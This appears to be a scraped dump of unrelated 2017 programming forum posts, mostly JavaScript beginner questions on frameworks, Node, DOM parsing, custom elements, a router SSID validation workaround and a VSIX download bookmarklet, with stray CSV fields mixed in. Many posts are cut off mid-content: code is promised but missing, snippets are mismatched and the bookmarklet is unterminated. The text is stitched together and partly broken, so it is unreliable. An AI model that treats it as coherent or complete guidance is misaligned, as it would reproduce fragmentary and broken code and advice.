I understand that coding is a life long learning journey and i have nothing against learning new libraries but i just want to know what foundation i should lay first. Is ""html/css/javascript/sql/Github/REst/Django"" enough to land a job or is there something i am missing?

On top of all this, once i have the skills how do i go about landing the job? Create a portfolio and send it to employers on indeed and hope for the best?

Am I best learning the full javascript stack, including node, in 2017 for web programming / eventually apps, or should I learn Go instead and maybe combine Go with PHP?



as for my questions:



* Most tutorials use express.js, but from reading I've found that Koa.js is more ""up to date"" and uses ES6 instead of older stuff from previous JS versions. should I skip express 4 and use Koa.js, use express 5, or what? is koa.js the future, or will express.js continue to be the gold standard? I plan to use the latest version of node in my projects, so I don't care about backwards compatibility. I can use ES6 and all the goodies everywhere! (and to clarify: not trying to micro optimize here, just wondering if it's worth investing time into express.js)




* I dislike templating systems. I understand the reason behind them, but the added overhead is so unnecessary to me. I understand that the node.js community is kind of anti-optimizations, but let's be real, shouldn't node.js just be used to build an API which a front-end system such as react.js (or react.js on the node side rendering) is used to process and implement the data to a static HTML ""template"" file? like, let's say I use react.js on the front end (or angular.js, but I'm not too familiar with it. I've messed with react.js a tiny bit though) should I simply skip the added ""templating"" stuff that goes on in these tutorials? is react.js a good replacement, on the backend, for these templating systems such as Jade? I wish I knew how to word this question a little better. hah. 



* is there an article or cheat sheet for best micro-optimization practices you should remember? I'm sorry I suck at wording this question. but for example, in php, using ' instead of "" in static variables parses faster. it's problly less than 10ms improvement over a lifetime of an app in reality, but I'd prefer to code the right way in javascript from the start if it doesn't hinder readability. doing `const poop = 'pee';` is just as readable as `const poop = ""pee"";` but if this were php code the use of ' instead of "" would be an extremely minor improvement and every little bit counts + why not if it doesn't change the amount of time it takes to build the app and doesn't hinder a single thing? I hope I explain this okay so somebody understands and can point me in right direction.




* there's SO many modules that do the same thing on NPM, and I'm still a noob to javascript, so I'm just wondering how I choose the right ones without reading billions of files? 




* should I use promises for every bit of code? lol





* node.js (and javascript in general) is so convoluted and fast moving... how the hell do I keep up with it? 



* what're best security practices with node.js? this is main issue why I'm scared using other people's code and dislike billions of options for the same thing :x what are things I should avoid? what about uploading images, what package for uploading images? OOOH and do packages like facial recognition exist?! javascript so exciting 



* is javascript/node not OO? do classes exist and should I even bother using them, or is it all about modules? 


* what IDE has rich features for javascript? I use sublime text with addons for php, but visual studio 2017 has node and is really fancy but I have no idea how to set it up!!! I hear webstorm is good too? 


* is there a KISS guide to bug testing, debugging and a KISS guide to unit testing? I feel dumb and have ADD when I read about unit testing because I still don't get it or how it's done lol

272,2017-03-08 10:20:33,26,11,"I've been using DOMDocument a lot lately and stumbled upon a weird bug.

Consider the following HTML:

    &lt;div&gt; &lt;!-- Offending div without closing tag --&gt;
    &lt;script type=""text/javascript""&gt;
           var test = '&lt;/div&gt;';
           // I should not appear on the result
    &lt;/script&gt;

As you can see, there's a div tag with no closure, which is actually in the test variable, inside the JS script. If you load that HTML onto DOMDocument, libxml will take that closing tag as the missing tag and leave the rest of the script inside a p tag. So for example, if you remove that script tag with removeChild, your final HTML will look like this:
    
    &lt;div&gt; &lt;!-- Offending div without closing tag --&gt;
    &lt;p&gt;';
           // I should not appear on the result
    &lt;/p&gt;&lt;/div&gt;

I wanted to update the libxml library but seems that it's bundled to PHP and has to be recompiled in order to change it, which makes the process impossible if you use any shared hosting like Heroku.

I was wondering if that was a problem on my side because I was using PHP 5.6 (libxml 2.8.0) but after doing php -i on PHP7.1 I noticed that the libxml version is still the same!

Checking the [sources of libxml](ftp://xmlsoft.org/libxml2/) I noticed that libxml 2.8.0 was released in 2012, a 5 year old release.

My question is why is this version so old and it was never updated. Does anyone knows how to update it without recompiling or at least a way to avoid this bug?",Why is the bundled libxml library so old?

I need your advise. Its 2017 and I don't know where to start with developing my next application.

Principally I want to collect some data from an API, store them into a database and display those data 
in form of graphics to the user.

Conditions:
- User can register / LogIn
- Collect data from API &amp; store them in DB (I have to collect data cyclical, around every 24 hours once)
- Display data from database in form of graphics

So, it's been quite a long time since I developed my last web-application. I really want to put some effor
in learning new technologies and building the application in a future-oriented way.

So for me its totally clear to use javascript for the frontend. There are so many cool graphic-librarys, there's
no reason why I shouldn't use it. But I've some problem with the backend part...

I really like to do things with PHP, but I'm open for new things and I don't know if PHP is still the right
thing to go. I thought about some some simple javascript frameworks like express, or may even a full-stack framework
like meteor. But I just don't know if its a good idea, I mean, principally a user login &amp; API calls can be done
so easy with PHP, I don't know if its worth to use javascript for those tasks.

And if I use javascript, what should I learn? I know its a really opinion-based question. In fact, I just want to know
if its worth to getting started with meteor or not. Or if its worth to do those tasks with javascript at all?

So what do you think? I'm really open for everything, and I know its really opinion-based. I also know I can do
it how I want... but I just want to hear some advise of people developing web-apps in 2017. ;)

I am interested in possibly converting these to custom elements but I had some questions I can't seem to find online.  Any answers or directions to better tutorials would be much appreciated.  

* are custom elements faster than the div soup I have now?  slower?  Slower in IE after I polyfill them?  (right now everything works in IE out of the box).  

* often these elements get included via ajax.  So they each have two JS loops which seek out the elements on the page, create an object in the window, and add some listeners.  One loop that runs after ""DOMContentLoaded"" and the other one as a mutation observer.  Does converting to a custom element remove this requirement?  

* Some of these elements have blur listeners.  Only I couldn't get it working right with the div soup, so I cheated and put a window click listener that determines what was clicked and if anything needs to be done.  Can you do this with custom elements?  does it solve some of the blur issues?  

*  How do you convert div soup into an element??  say for instance right now I have:

        &lt;div class=""wrap""&gt;
            &lt;div class=""head""&gt;&lt;/div&gt;
            &lt;div class=""optionsWrap""&gt;
                &lt;div class=""optionsInnerWrap""&gt;
                     &lt;div class=""option""&gt;&lt;/div&gt;

                     &lt;div class=""option""&gt;&lt;/div&gt;
                &lt;/div&gt;
           &lt;/div&gt;

            &lt;option&gt;&lt;/option&gt;
        &lt;/select&gt;

how to do this and how to set up the css and javascript has me completely baffled ??  I think I actually need an element in an element but I'm not sure.  

* if I wanted to extend the normal html element like select above, would this be possible??  for instance the out of the box option element is not style-able.  but if I simply make it into a div then it is.  would something like this be do-able?

* can you use external style sheets to style the div soup inside the element??  for instance 
    
    .optionsInnerWrap {
        padding: 10px;
    }

the reason I ask is that I need different styles for the same elements depending on where they are used....which is super simple with div soup but starting to get out of hand.....

Many of the developers and devops engineers at Cars.com are now using this tool everyday—if you routinely work on a large number of repos then you might want to make it part of your everyday toolset as well.

I'm posting this to /r/javascript because bitcar is written entirely in javascript. There's plenty of work to do if you're interested in contributing. To get an idea of some of the features I have planned you can checkout the [ROADMAP.md](https://github.com/carsdotcom/bitcar/blob/master/ROADMAP.md).",bitcar - Seemlessly jump between repos from the command line

In there I have tutorials in which I make htm files with js codes in them, on some files I'm able to just drag and drop into Chrome or Firefox and it will start the code but some files won't, it's probably blocked by browser for security reasons. I've enabled Javascript, turned off adblock and antivirus on my pc so I know thta's not the reason.

At first I would use jfiddle to paste js code only and test it out but jsfiddle doesn't allow ""document.write"" code to be used which many of the tutorials in the book use.
I also tried firebug for Firefox but I dont know how to use it, when I start it it opens up a panel without any javascript.

I found what I believe to be the source of the message in *../www/general.js*:

    ...

    function validate_ssidchar(ch) {
    if (ch &gt;= 32 &amp;&amp; ch &lt;= 126)
        return true;
    return false;

        c = o.value.charCodeAt(i);
        if (!validate_ssidchar(c)) {
            alert(""&lt;#JS_validSSID1#&gt; "" + o.value.charAt(i) + "" &lt;#JS_validSSID2#&gt;"");

So to my non-javascript eye, it looks like it's checking if the SSID contains characters inside of the acceptable 32-126 ascii range, and denies if not, correct?

What would be the easiest way to get around this check? Can I block this bit using browser console or something?

If the only option is to edit the file and reflash the firmware, what should I change/remove exactly?

1. Go to router's admin page 
2. Change SSID to 💩, get error message
2. If on Chrome: Press F12 and click on the Sources tab
3. On the left you should see a list of files with .js extensions.
4. Click on ie. 'general.js', and search (ctrl+f) for 'SSID' or the text that appeared in the pop up that prevented you from using emoji SSID. What we need is something like `function validate_ssidchar` 
6. Click on the console tab, type `validate_ssidchar` (or whatever your router-specific function is), press enter, and see if it complains.
7. Then simply reassign it by typing `window.validate_ssidchar = function () { return true; };`, press enter. 
 (obviously change `validate_ssidchar` to yours.)
8. 💩 should work normally now.

My name's Tim and you might remember me from [my original post](https://www.reddit.com/r/javascript/comments/4sujup/hey_rjavascript_my_names_tim_and_i_want_to_teach/) from 8 months ago - I promised to teach people to build products using javascript for free.  
Today I've uploaded the final video of my free open source course ""Build products with javascript"".
All materials are published absolutely free, without any ads and under permissive licenses (MIT for code, Creative Commons for videos).

The course contains [11 videos](https://www.youtube.com/playlist?list=PL_gX69xPLi-ljVdNhspjZUlPmBNjRgD2X) that go through the process of creating the client-server application using javascript (node.js, react, webpack, that kind of stuff).  
Those videos cover all the process of creating the app:

 - figuring out the idea,
 - setting up a project with git,
 - picking a database,
 - using docker for development and deployment,
 - building REST API,
 - building web app client for that API with React/webpack/etc,
 - unit testing all that,
 - and finally - (continuously) deploying it with docker.

Additionally, per request of some viewers, I livestreamed the process of development that preceded the explanatory videos.  
There are [13 livestreams](https://www.youtube.com/playlist?list=PL_gX69xPLi-nM52i7LyeEo8Rpu9t_s9tV) that cover most of the explanatory video I did.

There are two reasons why I'm writing here:  

1. Maybe there are some people who'll find it interesting
2. I need your help to decide what to cover next!

Doing this course was quite a lot of fun. I had to learn a ton of things myself and received a lot of very interesting questions from viewers.  
So I want to keep doing that.  
And now I need your help to decide on what area to talk about next.  
Here are some of the topics I think would be cool to cover:

 - Introduction to web technologies (in-depth intro to web tech that prepares you for the old course)
 - Creating mobile apps using web technologies
 - Creating desktop apps using web technologies
 - Building real-time apps using WebSockets
 - Adding features (e.g. offline, push notifications) using Service Workers
 - Applying Machine Learning for fun and profit
 - Using WebAssembly (hot off the press, would be fun to play with)

If any of those sound interesting and you want to help me figure out what to do next - please leave a comment here or to [my conclusions video](https://www.youtube.com/watch?v=okVXyUZHKbU&amp;feature=youtu.be).  
And, of course, I'll be happy to answer any questions you might have!

But there are other pages that are created with java/.net/ajax/whathaveyou that basically must be accessed with a browser because they don't fully load right away.  My process at the moment is to visit the site, download the file, go to my own site, and upload the file (to a script that parses/inserts the data).

-automate windows itself using vbscript or powershell, which means learning yet another language

-somehow get the php server to open a browser and run on its own?  

-have the web crawler visit a locally hosted page which can access the file on the local machine and somehow send it to my server

-somehow intercept the file download process and send it to my server instead (via ajax)

-somehow intercept the file download process, open the file, get the contents, and send the (already parsed) contents to my server.

I think overall what I am confused with is just getting the item into the cart. I figured I would write the program in javascript.

How can you add an item to cart in such a way that you are not dependent on the structure of the web page? The reason I want to avoid this is because if the site changes the structure of the page then your $(""#myelement"") selector may not work any more.

* Class public and private variables

* Class public, protected and private functions

* Class public virtual, protected virtual, and private virtual functions, including support for ""finals"" and pure virtual functions.

369,2017-04-02 17:39:24,68,78,"I read this (https://github.com/airbnb/javascript#functions) but I really don't understand it.

I think I understand the first sentence. To reword it for clarity: Because they are hoisted, function declarations can appear anywhere in the code. Cool, but who cares? Oh, wait, what I needed to infer was, *we want you to put all your functions at the top of the code.* I guess? I have no real idea because it doesn't explain the why very well. That's just my best guess. OK, fine.

But I still don't understand why a function expression is bad (I guess because I don't know much about the error's call stack?) Can someone *show* me with examples why named function expressions are better than function expressions?

And, does anyone actually do this outside of AirBnb? I'm still a novice, so I haven't seen as much code as more experienced devs but I don't recall seeing this being done or taught anywhere.

&gt;7.1 Use named function expressions instead of function declarations. eslint: func-style jscs: disallowFunctionDeclarations

&gt;Why? Function declarations are hoisted, which means that it’s easy - too easy - to reference the function before it is defined in the file. This harms readability and maintainability. If you find that a function’s definition is large or complex enough that it is interfering with understanding the rest of the file, then perhaps it’s time to extract it to its own module! Don’t forget to name the expression - anonymous functions can make it harder to locate the problem in an Error's call stack.

    // bad
    function foo() {
      // ...
    }

    // bad
    const foo = function () {
      // ...
    };

    // good
    const foo = function bar() {
      // ...
    };

I'm creating a dependent dropdownlist between licensename and licensecode, so depending on what license name you select, it will provide the product keys under that license name.

            &lt;/div&gt;
        &lt;/div&gt;

and I'm using jquery to bring in the list of product keys for that licensename.

    &lt;script type=""text/javascript""&gt;
        $(function () {
            $(""#LicNameID"").change(function () {
                $.get(""/License/getProductKey/"", { ID: $(""#LicNameID"").val() }, function (data) {
                    $(""#LicCodeID"").empty()
                    $.each(data, function (index, row) {
                        $(""#LicCodeID"").append("" &lt;option value='"" + row.LicenseCodeID + ""'&gt;"" + row.ProductKey + ""&lt;/option&gt;"")

                })
            });
        });
    &lt;/script&gt;

Here is the action method that is being called by the jquery

    public JsonResult getProductKey(int ID)

Scrapers, data mining, web apps with Django/Python but my front-end skills really only consisted of some vanilla JS and jQuery for things like event listening, XHR etc. Nothing really that separated the front from back.

Now I'm starting my own personal web app and want to get up to speed with JS concepts and trends. Since it's my own personal project and I can allow myselft to delete it and start again if necessary, I can allow myself to use pretty much anything.

But jumping into JS world today is a nightmare. React, Angular (1,2), Vue, Backbone, Webpack, EcmaScript, TypeScript all these new frameworks and terms at once gave me a headache and I can't decide what to choose and where to start. This blog post - [How it feels to learn JavaScript in 2016](https://hackernoon.com/how-it-feels-to-learn-javascript-in-2016-d3a717dd577f) sums up my experience so far. So maybe you could help me out with the most crucial things to learn and use.

My project in a nutshell is a simple CRUD web app in Django. Imagine Airbnb but a lot more simpler. What frameworks and libraries should I use? I.e. things like Angular vs React etc. It's not my intention to start a ""vs war"", I just really can't decide between a ton of things in JS world. 

And ""react is just a view layer and angular is a full-blown framework"" doesn't ring any bells with me. I understand MVC pattern as I've used it quite a lot with Django for example, but I can't think of using models, views and controllers at fron-tend boundary level as front-end always has been just a ""view"" (template in Django) for me that just meant HTML templates.

I read this [article](http://get-finch.com/2017/03/28/why_node_solved_the_wrong_problem.html) which was making complaints about Node not using more than a single core per process. While I disagree with the authors complaints as I think they miss the mark on what Node was designed for I wanted to make sure everyone understood you can in fact do what their complaints touch on. 

[Hamsters.js](https://github.com/austinksmith/Hamsters.js) can readily be used within Node to parallelize individual functions or run them concurrently. The documentation isn't perfect and the website needs updated and the es6 version needs improvement (I'm only one person) however there is nothing from a technology perspective preventing anyone from threading logic within Node.js and I hope in the future authors take things like 3rd party worker implementations and libraries like Hamsters.js into account.",Node multithreading clarification

- Simplicity
- No bloated custom object model like Ember
- Allows use of bare bones javascript to solve problems (like dependency injection, something easy to do in native js, yet certain frameworks choose to over complicate it)

What I don't like is Virtual Dom, and maybe I'm wrong, that's what I want to find out.

From the beginning I thought Virtual Dom was a bad idea in the context of web frameworks, somewhere where efficiency should be key. I understand that up until recently (Glimmer) frameworks using Virtual Dom have outperformed others, but it baffles me as to why this was.

How I understand Virtual Dom to work is basically this:  
A Dom like structure that can be updated with new state changes; That structure is then compared to the real Dom and differences collected; Differences are then used to find the best update path (least amount of Dom operations)

This sounds cool, but also ultimately rather wasteful.

Why not use an observer pattern, and for each dynamic bit of content setup an observer to watch the properties used in that content. Then when that observer is triggered schedule the content for re-render. This is a stupid over simplification, but I don't believe an actual implementation would be all that complicated.

I'll show as much of my code as is possible; however, the solution is built on top of a SharePoint list form, so I'm cutting out a lot of junk you'd normally see.  I may end up cross-posting to /r/sharepoint, but you guys are a little better suited for this kind of work, I think.  The problem is purely javascript/jquery.  Bonus, because SharePoint, I don't have to worry about cross-browser compatibility.

On the first step, the user is presented with three fields:

    &lt;div id=""fields""&gt;
        &lt;input title=""Title"" id=""siteTitle"" type=""text"" class=""validate""&gt;
        &lt;input title=""Requested URL"" id=""requestedURL"" type=""text"" class=""validate""&gt;
        &lt;textarea title=""Site Purpose"" id=""sitePurpose"" class=""validate"" rows=""10"" cols=""20""&gt;&lt;/textarea&gt;
        &lt;div&gt;&lt;span id=""count""&gt;200&lt;/span&gt; characters remaining.&lt;/div&gt;
    &lt;/div&gt;

In order to proceed, a number of things must be true:

* The Title field must have a value greater than 2 but less than 25.  On focusout (I think), if Title is empty or Title doesn't meet the character requirements, I need to run `fieldError`.
* The Requested URL field must have a length between 2 and 15 characters.  On focusout, run `fieldError` if it doesn't meet the requirements.
* The Site Purpose field must have *at least* 200 characters.  On keyup, I'm decrementing a character count that starts at 200.  On focusout, if the character count is greater than 0, again, running `fieldError`.

If all fields pass all tests, I want to enable a button with an ID of next that will allow the user to proceed to the next step.

Hopefully that makes sense.  Here's what I have so far, don't laugh at my jQuery, I have a BA in English:

The button will get re-disabled if I do anything to a previous field that takes it out of the validation I've set, but as soon as I start typing, if any of the fields meet requirements, the button is re-enabled.

The thing I want to accomplish is to make sure if every page of my website is working (even checking status code will be fine) before code will be deployed, so running it on Travis looks reasonable.

I have some questions regarding the terminology of JS in an object oriented context. How do you call the following examples(would be thankful, if you could also tell me synonyms if they exist regarding the examples):

    function CreateMeAnObject() {
    	this.name = 'tim'
    }

1 **How do you call this code snippet?** 

To me it´s a constructor function. Am I right? Any synonyms? I came across some articles calling them ""classes"", but afaik javascript doesnt support/work in classes, since you can add/remove properties and functions(methods) later in the code.

    var myObject = new CreateMeAnObject();

Since javascript is single threaded, we don't want to block the event loop. So we need to create a worker that periodically fetches 11 million rows of data from Redis and loads the data into memory. This may take a while, so we want to create a worker so there's a different event loop. How can we do this with ECS? Can we just use an npm or do we have to do anything special like setting additional stuff up on the Amazon console to have a separate worker?

Furthermore, is this a good design pattern? Do I need a worker to do this? If I use a worker in Node, after I query the 11 million rows of redis data and save this object into memory, can the main server (main event loop) access this object?

The previous design pattern was: for every time out server is hit, we would query one key in the Redis database. This operation takes 100 ms, which is too slow for our purposes. Hence we want to load the entire 11 million row database every 5 minutes and save it into the server's memory. So we wouldn't need to make an additional round trip to call Redis.

I have developed simple web-based database applications, such as an inventory service request programs in ASP.NET. Being that they were server-side platforms, securing access to the database was easier and made sense to me.

I’m trying to get more into mobile-app development, and as a bridge to do so, I started with Javascript, jQuery and Bootstrap. I have also been using Firebase as a database. This has all worked pretty well in development, but one thing I am not understanding at all, is how I would secure access to the database. Javsascript is all client side, and all the methods that read/write to and from the database are available to anyone to see, copy, and modify, including API keys. From how I understand it, this could lead to people writing junk to the database if the wanted to with modified version of the client-side code. I do require an email address to be verified before writing, but this is far from a deterrent to polluting the database with crap.

Ultimately I guess I would be writing the apps native with Swift or whatever platform I choose, and I assume this would be less of a problem, but since Firebase does make a Javascript API, I am also assuming that there is a way to secure the database. Maybe Firebase isn’t the way to go, but it seems no matter what I used for a database, being that client-side is JS, I would still have the same problem.

Can anyone point me to a good source where I can learn how to make the sidebar not reaload with every html change?

[Here](http://gph.is/2q3NDbz) is how my app is working now - notice the reloading of the sidebar, which is what I dont want. 


I have looked through source code of other apps, but they are a little hard to follow at my current stage, so a turorial where I can build that from scratch would help. Form what I can gather however, the way these apps work is either one of two ways


1) The menu bar is built with html using an unordered list and then the loading actions are taken care of with javascript (this seems to be the most common way)

2) like the first, the menu is built with html and the loading is done unsing imports. Then the html content is loaded with javascript and then hidden or shown as one clicks on different items.


In addition, I read a post that said that if the page is formatted with all the js at the bottom, then it would load so fast that the reloaind of the page will be unoticeble, but this doesnt seem to do it for me.

My websocket is loaded on the `window.onload` event, I tried using jquery and `$(document).ready` but it still did the double-connect.

After I post this, I'll find out whats causing the disconnect, because maybe I can just trap the disconnect and maintain the original connection, but I'd prefer to know when the page is *actually rendered* in the browser's view so I can send more data.

520,2017-05-07 17:47:37,8,6,"I am using WKWebView to navigate a webpage invisibly for a user (which will inevitably lead to a booking page which I will need to show for the user to complete). I can use javascript to modify input elements on forms, or click various buttons to navigate around. I can also read the body of the html and the page title that WKWebView supplies. 

&amp;nbsp;

I am having issues with a page that is dynamically created in Javascript, luckily the values I am looking for exist within the body of the html but as I am capturing a decent amount of values per page, I end up slicing up and splitting up various parts of the html source which works well as an end result, but is horrible to maintain.

&amp;nbsp;

I end up with a bunch of variables such as this:

     let departures = html.stripLeftandRight(left: ""class=\""time\""&gt;&lt;span class=\""timeLeft\""&gt;"", right: ""&lt;"")
     //let travelTime = Same as above but with different left and right string values to strip away

strip left and right is a simple extension I made to remove everything to the left and right of a value:

     extension String {
     func stripLeftandRight(left: String, right: String) -&gt; [String] {
         var results = [String]()
         let filtered = self.components(separatedBy: left)
         for result in filtered {
             if result.contains(right) {
                 let finalResult = result.components(separatedBy: right).first!
                 if !finalResult.isEmpty { results.append(finalResult) }
             }
        }
         return results
     }

&amp;nbsp;

Now this leaves me with a fair few issues, the first of which is as you can see I have departures and travelTime as variables but when I have 10-20 different variables which are created in a similar fashion I need to go and find the html to the left and right of each value i am looking for. This code is incredibly vulnerable to inaccuracy should the host of the page make any simple changes I would have to try and dig through the entire html to find the left and right values to the string I was trying to capture rather than find a simple ID or element within the page to pull the results from. 

&amp;nbsp;

Another issue is the manor in which I am generating the results, currently I have a struct that will take in a departure , travelTime etc etc so using my current method of capturing these values I need to loop over 0..&lt;departures.count and build a struct each time I loop with the values of departures[0] , travelTime[0] etc, departures[1], travelTime[1] .... until all results have been ""built"" into usable data structures. Again.. although this approach works, it certainly again feels like a convoluted / vulnerable way to build my structs. 

&amp;nbsp;

As I continue building in this way the more I realise how difficult it is becoming for me, let alone if somebody else had to work on a project that was structured this way. Any advice would be really appreciated. Thanks!

541,2017-05-13 00:15:01,53,36,"First I started learning:

* HTML and CSS

Okay, this is kind of doable, CSS has quite a lot of stuff you can learn, but okay, no problem.

But then soon enough, you will found out that if you want some kind of cross browser grid, you need some kind of CSS framework like:
* Bootstrap or Foundation or whatever else

But hey, you can't even use variables in CSS, and no nesting, so you are better off, learning:

* SASS, LESS or STYLUS

So no to make something even a little bit interactive, I need:

* Javascript, Native DOM API or Jquery

To learn javascript and the DOM API will take probably a couple of months, but once you have learned that, you will find out that all your code keeps becoming unreadable spagetti with this, and that you probably need to learn some virtual dom kind of coolness like:

* React, Vue, Ember, Angular2, some other hipster thing

Somewhere in between you would probably also learn that you javascript ES5 book was outdated, and that most frameworks, now expect you to write stuff with:

* ES6, ES2016, ES2017, babel, webpack, fetch, npm

So somewhere in this journey you will find out that it would be cool to persist some data to a sever, or get data from a server, so you probably need to learn:

* AJAX, JSON, XML, some library like jquery, or axios, because native dom api sucks

Also somewhere in between you will find out that you need something like git for version control, and github, to put your projects in the cloud.

Oh and yeah, you need to find out what a server is, maybe also learn a bit about linux operating system, maybe try 3 different server side languages, before you found one you like (this will takes you years and years to learn):

* Linux, terminal, bash, zsh, php, ruby, python, java, nodejs some hipster new language like reason or scala

Oh and yeah, for editing files on your production server, you need to learn vim (schedule at least a year):

* vim

Oh and then, you need to learn something to actually store that data you send with AJAX to your server, so learn about:

* MySQL, mongo, whatever

Tired of writing your database queries in php? You probably want to learn some kind of cool server side framework with ORM, security featuers and what more:

* Laravel, Sympony, Ruby on Rails, django, ...

Then you will find out that dynamic typing and object orientated languages are shit, and that you will need to learn some functional statically typed language, like haskel or clojurescript. Later you find out, that for getting a job, you are better off learning laravel, so you go back to old school stupid php.

So you give OO programming a second chance, and you start learnig about concepts like this in more detail:

* Inheritance, Composition, Polymorphism, Encapsulation, Interfaces, MVC, MV***, MV**FUCKME

Oh and also for your server, you will have to learn about:

* Apache, Nginx

Oh, and for you development machine, you will probably want something like:

* Vagrant, and maybe some wrapper around it as homestead

Oh, and, somewhere in between:

* RegEX

And because of all the regressions that end up while you are writing code, you learn

* testing, test frameworks, selenium, TDD, BDD

Oh, and then when you finally think you understand something about web programming, you are going to find out about:

* Architecture, Command Bus, CQRS, Event storming, Emergent Design

Oh, and wait, we also need to learn a bit about design, and how to make things pretty!

* Photoshop, Illustrator, PNG, SVG, UI design, UX design, User psychology, chrome dev tools, performance tuning

At this point, you are so full of stuff, your brains are almost exploding, and then people are going to talk to you, that you do it all wrong, and that you need to make a progressive web app, and learn about service workers, web workers, push notifications, history pushstate routing.

The absolute explosion of innovation in cross platform and emulation demos I've seen in the last few days of Microsoft's build have me giddy with excitement. I have downloaded VisualStudio for Mac and the related packages. They have graciously offered a 60 day trial of Xamarin university to go with it. The only piece that is missing is that I don't know C#....

Now windows has the WSL and some *nix* chops. They are running full emulation of x86 win32 apps on ARM devices. I am a 10 year OSX guy looking at MSFT laptops. That is f****ing awesome. Think about the enterprise and apps, then think about that again... They extended an olive branch to JS devs a long time ago. 

It is absolutely trivial to make an Android or iOS app with the new VisualStudio. I mean it is damn near seamless. I wish I could say the same about packaging my Python stuff. 

Electron is, for all it's warts, an absolute miracle for javascript developers. They have it pretty good these days if you ask me. While the pace of ""new"" on the JS side of things is dizzying and a bit terrifying... it is no less magical.

I know JS doesn't compare to Python in terms of readability and the derived joy to work with. JS doesn't have the depth nor the breadth of scientific libraries. JS is really hard to get ""right"", and has more warts than most languages out there. However, find me a place where JS doesn't run these days. Find me a platform that isn't super easy to target with JS that is easier to target with Python... 

Python is amazing to work with on your local machine. Python has a million libraries and can do more out of the box than most languages with libraries combined. However, python lacks innovation for packaging and deployment... I seriously dread it. I wish I was either crazy enough to make Python work like Electron|React|Xamarin or actually smart enough to pull it off... sadly, I am neither.  

I am sad in a sense that I know what I should do. The future for Python seems pretty niche honestly. The major corporate backing for Python seems to be in Machine/Deep learning and AI. Will that hurt the long term usefulness of Python as a general purpose programming language? I don't know. I do know that MSFT is going to pour money into their cross platform tooling which is already compelling... I know that JS devs don't give 2-shits about anything and just make cool shit that runs everywhere despite flaws and warts.

----

I had this epiphany recently in response to [another question](https://www.reddit.com/r/javascript/comments/6awplt/is_it_even_possible_to_deep_copy_factory/dhivj12/).

In every other language I know of, an object can access private properties not only on itself, but also on other objects of the same type. Here's an example in PHP:

    class Thing {
        private $somePrivate = 42;
        
        public function isEqual(Thing $otherThing) {
            // Access privates of ""this"" object *and* privates of ""other"" object of same type
            return $this-&gt;somePrivate === $otherThing-&gt;somePrivate;
        }
    }
    
    $o1 = new Thing();
    $o2 = new Thing();
    $o1-&gt;isEqual($o2); // true

But factory functions wouldn't allow this. A factory function's privates are *so* private that not even objects of the same type can peek inside. Here's the same concept implemented as a JavaScript factory function, but it doesn't work:

    function Thing() {
        let somePrivate = 42;
        
        return {
            isEqual(otherThing) {
                // This will never be true because `otherThing.somePrivate` will always be undefined
                // There isn't actually a way to read `otherThing`'s private variable
                return somePrivate === otherThing.???;
            }
        };
    }
    
    let o1 = Thing();
    let o2 = Thing();
    o1.isEqual(o2) // false

I typically use the class syntax, so I haven't run into this problem before, but as it turns out, a factory function object simply wouldn't be able to implement an `isEqual` method like above. It seems the best way to achieve private but not too private is still [weak maps](http://exploringjs.com/es6/ch_maps-sets.html#_keeping-private-data-via-weakmaps).",Factory functions' privates are *TOO* private

Company I work for is going to start a new project that will use quite high amount of data, few tables with several millions record each. My team for many years was stacked in the same project that was using asp.net web forms and GridView control for displaying data, so we decided to take opportunity and go with asp.net mvc web api + javascript framwerowk for UI, mainly to try and learn something new.


There are tons of javascript grid controls online that have built in sorting, paging, filtering etc. but as I remember over 90% of them do this in javascript, which require whole datasets to be loaded prior these actions. We are afraid it won't work for our tables with millions records  and performance would be terrible.


Could anyone advise what approach should we choose in such case? We are considering Angular 2 or Vue.js for now and will probably need to find a javascript grid control that works well with ajax calls for sorting, paging so we will be able to load smaller chunks of data. I should also add that we are not javascript experts so difficulty of framework is also important factor.

**What I'd really like is:**  

- **To display** *Horizontally* across the screen,  as **Collapsible items / Panels / Cards** *the various levels of Data* (XML and/ or JSON - I can easily convert between them using XMLSpy)  
  - `[Page 1] [Page 2]... [Page N]` 
    - Arrange `Folders / Items` under each collapsible `Page` (*vertically* or as an X-Rows x Y-columns grid)
- **Bonus**: To have it **Data Bind** so any changes reflect back on the data
  - Even better, if I can ***drag &amp; drop/ edit/ move** the items to **re-organize***, which reflect back on the data  
  - I believe this part might restrict or shortlist the paths I can take? Thoughts?   

----------

There are **too many JS frameworks, libraries, mechanisms, MVC/ Patterns &amp; varieties of pieces of JSfiddle examples** around this and I believe if set on the right path I should be able to assemble things. 

But, since this is an experimental thing, I'd like to minimize ""lost in space"" time.  

- What **architecture, framework, direction**, (&amp; programming lang/ framework - if other than `js/ javascript`) would you recommend for this?  
  - Is there a better place to be asking this?   

PS: These are screenshots of the 100+ tabs I've opened/ read for this and I am more confused by the alternative paths a person can take :).

Luckily, Microsoft lets you install VSCode extensions by grabbing them from `http://${publisher}.gallery.vsassets.io/_apis/public/gallery/publisher/${publisher}/extension/${extension name}/${version}/assetbyname/Microsoft.VisualStudio.Services.VSIXPackage` and then renaming it to the `.vsix` extension. You can then install the extension manually in VSCode by going to the extensions tab on the left, hitting the ellipsis additional options, then choosing `Install from VSIX...`. It was a bit of a pain to get all the extensions I wanted, so I made a bookmarklet that downloads it and renames it to the pattern I want.

I've included it below. To install it, make a new bookmark in chrome and paste the _entire_ code into the URL field.

To use it, go to a VSCode extension page like [this](https://marketplace.visualstudio.com/items?itemName=robertohuertasm.vscode-icons) then click the bookmarklet.

    javascript: {
    	const vss_extension = JSON.parse(document.getElementsByClassName('vss-extension')[0].innerHTML);
    
    	const publisher = vss_extension.publisher.publisherName;
    	const extension = vss_extension.extensionName;
    	const version = vss_extension.versions[0].version;
    
    	let newURL = `https://${publisher}.gallery.vsassets.io/_apis/public/gallery/publisher/${publisher}`;
    	newURL += `/extension/${extension}/${version}/assetbyname/Microsoft.VisualStudio.Services.VSIXPackage`;
    
    	fetch(newURL).then(res =&gt; res.blob()).then(myBlob =&gt; {
    		const a = document.createElement('a');
    		a.href = window.URL.createObjectURL(myBlob);
    		a.download = `${publisher}_${extension}_${version}.vsix`;
    		a.click();

The final output is only numbers and I want a currency symbol in front of the final value amount output and I was wondering how I could do this for every currency for the output amount.

I'm a first year geology student doing some basic IT lessons at university. In our course ""data and visualisation"" my group and I have to do a project to show some data in a nice way. Initially we were 4 working on the project, but one doesn't continue uni anymore and one doesn't really know how to code.... So my other friend and I are left with the work for four and we barely had 3 weeks to work on it. You see the problem ^^'

We have two different GeoJSON files. The one with world map polygons and country names, one with volcano data (name, eruptions strengh, geographic placement...).
